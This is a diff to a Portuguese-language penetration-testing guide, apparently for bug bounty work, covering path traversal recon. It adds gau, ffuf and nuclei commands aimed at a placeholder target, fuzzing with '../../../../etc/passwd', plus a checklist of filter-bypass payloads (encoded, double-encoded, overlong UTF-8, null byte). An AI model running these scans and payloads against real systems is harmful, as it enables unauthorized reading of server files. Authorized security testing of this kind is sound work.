@@ -617,15 +617,39 @@ Módulo de monitoramento do Spring Boot. Quando mal configurado, expõe endpoint
 
 ### **4.3 Path Traversal (Directory Traversal)**
 
-*   Procure por parâmetros que parecem manipular arquivos/caminhos: ?file= / ?path= / ?name=
-*   GET /download?file=../../../../etc/passwd
-*   Se o ../ literal for bloqueado, tente bypass de encoding
+`Recon:`
+
+*    Parâmetros que cheiram a arquivo/caminho: file , doc , download , id , name , folder , lang , view , path , include , pdf , page , img , template , style , report .
+*    Funcionalidades que servem arquivos: download de relatório/nota fiscal, preview de anexo, troca de idioma/tema (carrega pt.php / en.php ), geração de PDF, visualizador de imagem.
+*    Extensões na URL: se a URL termina em parâmetro, é candidata forte.
+
 ```bash
-..%2f..%2f..%2f..%2fetc%2fpasswd
-%2e%2e/%2e%2e/%2e%2e/etc/passwd
-....//....//....//etc/passwd
-..%252f..%252f..%252fetc%252fpasswd   (dupla URL-encode)
+# gau lista URLs históricas (Wayback/Common Crawl) do alvo;
+# grep pega só as que têm parâmetro com cheiro de arquivo
+echo "alvo.com" | gau | grep -Ei '(\?|&)(file|path|page|doc|template|download|lang|view)='
 ```
+
+```bash
+# ffuf faz fuzzing de PARÂMETRO: testa nomes de query string num endpoint
+# (-w wordlist de parâmetros; FUZZ é o ponto de injeção; -fs filtra tamanho da resposta "normal")
+ffuf -u "https://alvo.com/index.php?FUZZ=../../../../etc/passwd" \-w params.txt -fs 1234
+```
+
+```bash
+# nuclei tem templates de LFI/traversal; aponta pro alvo e ele testa os payloads conhecidos
+nuclei -u "https://alvo.com/relatorios/download?file=FUZZ" -tags lfi,traversal
+```
+
+<br>
+
+Checklist:
+
+*    Mapeei todo parâmetro com cheiro de arquivo (doc , download , lang ...).
+*    Confirmei com arquivo inofensivo: file , path , /etc/passwd (Linux) ou page , template , win.ini (Windows).
+*    Testei profundidade de ../ "de sobra" (6–10) e caminho absoluto.
+*    Tentei bypass de prefixo de pasta (/base/../../../etc/passwd ).
+*    Tentei bypass de filtro:  ....// , encoding %2e%2e%2f  , duplo encoding %252e.. , UTF-8 ..%c0%af .
+*    Testei null byte %00 (só faz sentido em legado com extensão forçada).
 
 <br>
 
